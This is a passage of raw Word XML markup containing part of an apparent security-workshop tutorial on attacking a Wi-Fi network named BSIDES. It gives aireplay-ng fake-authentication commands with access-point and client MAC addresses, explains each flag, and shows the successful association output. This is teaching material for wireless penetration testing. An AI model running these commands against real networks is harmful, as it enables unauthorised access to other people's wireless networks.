      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="5A09B8F3" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Power </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Management:off</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="4209161F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Link Quality=0/</w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>94  Signal</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> level=-98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">  Noise level=-98 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>dBm</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
    </w:p>
    <w:p w14:paraId="71A286EA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">nwid:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Rx invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">crypt:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Rx invalid frag:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="031EAF2E" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">           </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Tx</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> excessive </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">retries:0  </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">Invalid </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">misc:0   </w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>Missed beacon:0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4B33280A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0493E78C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="39269D28" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">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2 - Use </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>aireplay-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:b/>
          <w:bCs/>
          <w:color w:val="262626"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> to do a fake authentication with the access point</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1967E352" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="418887D2"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In order for an access point to accept a packet, the source MAC address must already be associated. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2DCF649F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0853FFBB"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To associate with an access point, use fake authentication:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="198665DA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="53FE2985" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="002A56B4" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="002A56B4">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 0 -e BSIDES -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="588BBE8A" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="04198B34"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62FDFFEA" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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-1 means fake authentication</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="454F8C6C" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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0 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>reassociation</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> timing in seconds</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="17CAF1F7" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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e</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> BSIDES is the wireless network name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5FB14554" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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a</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> 00:14:6C:7E:40:80 is the access point MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EBD94FD" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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00:09:5B:EC:EE:F2 is our card MAC address</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A096FD9" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="10"/>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Pr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> is the wireless interface name</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1714ABAE" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F0AEF81"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Success looks like:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3192F1AB" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Authentication Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D4E03BC" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Authentication</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="64F24299" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Sending</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> Association Request</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3CF1D8CD" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00DC6CB9" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t>18:18:20  Association</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00DC6CB9">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:color w:val="262626"/>
          <w:sz w:val="18"/>
          <w:szCs w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> successful :-)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2516F58F" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CD7348E"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Or another variation for picky access points:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="670821F8" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:color w:val="262626"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3E0C26FF" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="008D1EBD" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>aireplay</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-ng</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -1 6000 -o 1 -q 10 -e </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>BSIDES</w:t>
      </w:r>
      <w:r w:rsidRPr="008D1EBD">
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> -a 00:14:6C:7E:40:80 -h 00:09:5B:EC:EE:F2 wlan0mon</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7340E0CC" w14:textId="77777777" w:rsidR="00EB60F0" w:rsidRPr="00F80E8E" w:rsidRDefault="00EB60F0" w:rsidP="00EB60F0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:autoSpaceDE w:val="0"/>
        <w:autoSpaceDN w:val="0"/>
        <w:adjustRightInd w:val="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:cs="Consolas"/>
          <w:b/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
      </w:pPr>
    </w:p>
